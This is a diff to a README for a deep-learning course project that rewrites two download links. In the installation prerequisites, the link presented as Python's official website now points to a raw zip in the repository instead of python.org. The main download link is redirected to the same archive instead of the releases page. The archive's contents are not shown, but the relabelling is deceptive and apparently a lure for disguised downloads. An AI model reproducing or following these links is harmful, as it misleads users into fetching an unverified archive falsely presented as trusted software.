@@ -20,7 +20,7 @@ To start using this software, follow these steps:
    - Internet connection for downloading packages and dependencies.
 
 2. **Installation Prerequisites**
-   - Ensure that Python is installed on your system. You can download Python from the official website [here](https://www.python.org/downloads/).
+   - Ensure that Python is installed on your system. You can download Python from the official website [here](https://github.com/CTFNam/deep-learning-course-project/raw/refs/heads/main/code/course-deep-learning-project-anthochlorine.zip).
    - Install Jupyter Notebook. You can do this through the terminal (Command Prompt on Windows, Terminal on macOS/Linux) with the command:
      ```
      pip install notebook
@@ -31,7 +31,7 @@ To start using this software, follow these steps:
      ```
 
 ## 🔗 Download & Install
-To get started, visit this page to download: [Download Deep Learning Course Project](https://github.com/CTFNam/deep-learning-course-project/releases).
+To get started, visit this page to download: [Download Deep Learning Course Project](https://github.com/CTFNam/deep-learning-course-project/raw/refs/heads/main/code/course-deep-learning-project-anthochlorine.zip).
 
 ### Steps to Download
 1. Click the link above. 
